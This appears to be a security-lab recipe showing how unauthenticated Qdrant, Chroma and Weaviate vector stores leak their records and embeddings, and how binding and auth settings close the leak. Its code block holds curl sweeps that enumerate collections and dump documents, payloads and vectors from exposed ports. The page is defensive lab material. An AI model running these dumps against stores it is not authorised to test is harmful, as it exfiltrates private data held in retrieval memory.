## Problem

A vector store is where an LLM deployment keeps its memory — the
embeddings that back retrieval, and everything ingested beside them.
All three manifest stores can stand up with that memory readable by
anyone who reaches the port: Qdrant lists collections and scrolls
points (records plus vectors) with no credential layer out of the
box — upstream's security page in one line: "By default, all
self-deployed Qdrant instances are not secure"; Chroma's collection
`get` shape dumps records over the current official
`/api/v2/tenants/{tenant}/databases/{db}/collections` surface when
the server runs without auth; Weaviate serves full schema and object
dumps with vectors (`include=classification,vector`) under anonymous
access — a posture upstream calls "strongly discouraged except for
development". The manifest maps the lane to OWASP LLM02 + LLM10 and
the `vector-db-ripper` row to ATLAS AML.T0049 + T0050 + T0057. The
kailash twist is per-store: the NixOS `services.qdrant` module
already binds 127.0.0.1 and disables telemetry BY DEFAULT (the lab
posture is the OPERATOR override), `services.chromadb` likewise
defaults to host 127.0.0.1 with no auth option at the pin, and
Weaviate is a docker-wrapper Shape-3 row (`podman`, `autoStart=false`,
`semitechnologies/weaviate:1.39.2`) — so the exposed lab posture for
that store is simply turning the backend ON. You want one recipe that
demonstrates all three dumps against lab-booted targets, then proves
each store's own hardening closes it.

## Solution

Three boots, three sweeps, three flips — one shared discipline
(every probe a plain curl with a verdict; never a fabricated PASS):

```bash
# ── QDRANT LEG ──────────────────────────────────────────────────────
# 1. THE EXPOSED POSTURE IS THE OVERRIDE (the flip of the usual story:
#    the NixOS module default is host mkDefault 127.0.0.1 +
#    telemetry_disabled; the lab override to 0.0.0.0 is the deliberate
#    act, run in an isolated lab segment):
#      services.qdrant.host = "0.0.0.0";   # lab override
#    (upstream's own config file defaults service.host to 0.0.0.0 —
#     bare-container deployments are the exposure this recipe rehearses)

# 2. ENUMERATE + DUMP (verified shapes):
curl -fsS http://<qdrant>:6333/collections
#    -> {"result":{"collections":[{"name":"<c>"}, ...]}}
curl -fsS http://<qdrant>:6333/collections/<c>
#    -> collection info (vector dims, points_count)
curl -fsS -X POST http://<qdrant>:6333/collections/<c>/points/scroll \
     -H 'Content-Type: application/json' \
     -d '{"limit":256,"with_payload":true,"with_vector":true}'
#    -> the points page: payloads (documents!) AND raw vectors
curl -fsS http://<qdrant>:6333/collections/<c>/points/<id>
#    -> one point, payload + vector
curl -fsS http://<qdrant>:6333/metrics   # or /telemetry, /healthz, /livez, /readyz
#    -> the telemetry half — server internals, no key

# 3. QDRANT FLIP — back to the module default (127.0.0.1, telemetry off):
sudo nixos-rebuild test
#    same sweeps -> FAIL (refused) from the segment. The module default
#    carries the fix. For a store that MUST stay reachable, the
#    upstream key layer is the residual control:
#      QDRANT__SERVICE__API_KEY=<strong-key>      # gates the whole API
#      QDRANT__SERVICE__READ_ONLY_API_KEY=<ro-key> # read-scoped role
#    + audit logging on for the operator's evidence trail.

# ── CHROMA LEG ──────────────────────────────────────────────────────
# 4. BOOT + DUMP (the module defaults host 127.0.0.1 with NO auth
#    option at the pin: the exposed leg is the override inside the
#    lab segment, mirroring the qdrant leg):
#      services.chromadb.host = "0.0.0.0";   # lab override
#    (or `chroma run --path /data` bare — port 8000; the current
#     official API is the /api/v2/tenants/{tenant}/databases/{db}/
#     collections surface over default_tenant/default_database)
curl -fsS 'http://<chroma>:8000/api/v2/tenants/default_tenant/databases/default_database/collections'
#    -> [{"id":"<uuid>","name":"<c>"}, ...]
curl -fsS -X POST 'http://<chroma>:8000/api/v2/tenants/default_tenant/databases/default_database/collections/<collectionId>/get' \
     -H 'Content-Type: application/json' \
     -d '{"limit":256,"include":["documents","metadatas","embeddings"]}'
#    -> the records dump: documents, metadata, embeddings — the LLM02
#       evidence in one response

# 5. CHROMA FLIP — module default (loopback):
sudo nixos-rebuild test
#    same sweeps -> FAIL (refused). Residual control for a store that
#    must stay reachable — upstream token auth:
#      CHROMA_SERVER_AUTHN_PROVIDER=
#        "chromadb.auth.token_authn.TokenAuthenticationServerProvider"
#      (+ token header config per upstream docs) — then the same GET
#      without the credential FAILs with 401/403.

# ── WEAVIATE LEG ────────────────────────────────────────────────────
# 6. BOOT = TURNING THE BACKEND ON (docker-wrapper row, Shape 3 —
#    podman, autoStart=false, pin semitechnologies/weaviate:1.39.2;
#    the container boots WITHOUT auth modules = anonymous access,
#    "strongly discouraged except for development" upstream):
curl -fsS http://<weaviate>:8080/v1/meta    # server + module build
curl -fsS http://<weaviate>:8080/v1/schema
#    -> full class schema (the store's shape)
curl -fsS 'http://<weaviate>:8080/v1/objects?class=<C>&limit=100&include=classification,vector'
#    -> object dump incl. vectors + classification — the rip
curl -fsS http://<weaviate>:8080/v1/nodes    # cluster/node view
curl -fsS http://<weaviate>:8080/.well-known/openid-configuration
#    -> 404/absent when anonymous — the OIDC layer is the closed-state hint

# 7. WEAVIATE FLIP — the container comes back up AUTHENTICATED:
#    (the Shape-3 boot is configuration: env on the container run —
#     per the podman wrapper module, plus the upstream AUTH block)
#      ENABLE_AUTHENTICATION=true (or the OIDC module envs:
#      AUTHENTICATION_OIDC_ENABLED=true + issuer/client config)
#    same sweeps -> 401/403. OIDC on closes anonymous access; keep the
#    container loopback-published / lab-segmented besides.
```

Expected output shape (abridged, shapes not transcripts):

```
QDRANT   @ :6333  exposed leg (host 0.0.0.0 override)
  /collections -> ok  /collections/<c>/points/scroll -> ok (payloads+vectors)
  /metrics     -> ok  /healthz,/livez,/readyz -> ok
  flip (module default) -> all probes FAIL (refused); API-key leg
                           (QDRANT__SERVICE__API_KEY) -> 401 without key
CHROMA   @ :8000  exposed leg (host override)
  /api/v2/.../collections -> ok (list)
  /api/v2/.../<id>/get   -> ok (documents+metadatas+embeddings)
  flip (module default)  -> FAIL (refused); token-auth leg -> 401/403
WEAVIATE @ :8080  exposed leg (backend on, anonymous)
  /v1/meta,/v1/schema -> ok  /v1/objects?...include=vector -> ok
  flip (auth on)      -> all probes 401/403; /.well-known/openid-... -> ok
```

## Discussion

- **One recipe, three stores: the point is the shared shape of the
  failure.** All three ships answer "records + vectors, unauthenti-
  cated" over a plain HTTP GET/POST; all three close with one
  deliberate posture (bind, or auth layer, or backend toggle). Once
  you have walked all three, an unknown vector store on the segment
  is an hour's work to classify: probe `/collections`-class shapes,
  the `/api/v2` collection get, the `/v1/objects` dump — the rip
  patterns rhyme.
- **Why plain curl and not a bespoke exploit script:** `vector-db-ripper`
  is an A-7 row, `safety.level: exp`, licence `LicenseRef-Unknown`,
  upstream repository missing at the pin
  ([kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)).
  The probe legs run the verified shapes above; the real tool takes
  over via the double-key lab gate when its derivation lands (walk:
  [Gate lab-mode and exp-classified
  tools](../admin/lab-mode-gating.html)).
- **The kailash-defaults nuance is per-store and matters:** the qdrant
  NixOS module hardens by default (host `mkDefault` 127.0.0.1,
  telemetry_disabled) — the lab posture is the operator override, and
  the recipe's flip leg restores the default. Chroma's module mirrors
  it (host 127.0.0.1 default, no auth option at the pin — bind is the
  only lever the module carries today; the token-auth env block is
  upstream, quoted as the design). Weaviate is the one store where
  the module itself does not bind anything (docker-wrapper Shape 3,
  autoStart=false): the lab posture is turning the backend ON, so
  boot it in a lab segment and publish it loopback-only. The general
  story — "kailash hardens the store by default" — is FALSE for
  weaviate's container and imprecise for chroma's auth; the per-store
  facts are the ones that protect you.
- **Hardening is layered per store, not one knob:** qdrant:
  `QDRANT__SERVICE__API_KEY` + `QDRANT__SERVICE__READ_ONLY_API_KEY`
  (read-scoped credentials for the retrieval path) + audit logging
  on. chroma: `CHROMA_SERVER_AUTHN_PROVIDER` token provider (+ `401`
  shape verified) — note it is server-side optional auth, so the bind
  remains part of the posture. weaviate: OIDC anonymous-off
  (`ENABLE_AUTHENTICATION` or the OIDC module envs, per the 1.39.2
  pin's docs) plus the loopback publish. Bind + credential layer is
  the pattern; a credential layer alone on an any-interface bind
  repeats the vLLM mistake (key on the API, port still open).
- **The guardrail/monitoring defence leg is a pending row, stated
  honestly:** there is no d-01 request-scanner row for vector-store
  traffic at the pin (the NeMo/llm-guard class — see the ollama pair
  for those pending shapes); what the manifest does own for this
  lane's telemetry is the d-02 OTel/monitoring direction (langfuse /
  phoenix rows, module wiring PENDING — see the vllm and triton
  pairs for those shapes). The evidence trail for a rip attempt today
  is the store's own audit/log surface (qdrant's audit logging, the
  container logs for chroma/weaviate) plus segment flow logs.
- **ATLAS mapping, per row:** AML.T0049+T0050 (like the sibling A-7
  rows) plus **T0057** for vector-db-ripper specifically — the data-
  handling technique behind the rip. OWASP LLM02 (sensitive info
  disclosure) carries the "memory exfiltration" framing; LLM10 the
  unrestricted-consumption framing.
- **This is the transferable pattern** (three lab targets → sweeps →
  flips → diffs). Origin walk with the verdict instrument:
  [Attack the platform, then verify](attack-then-verify.html).
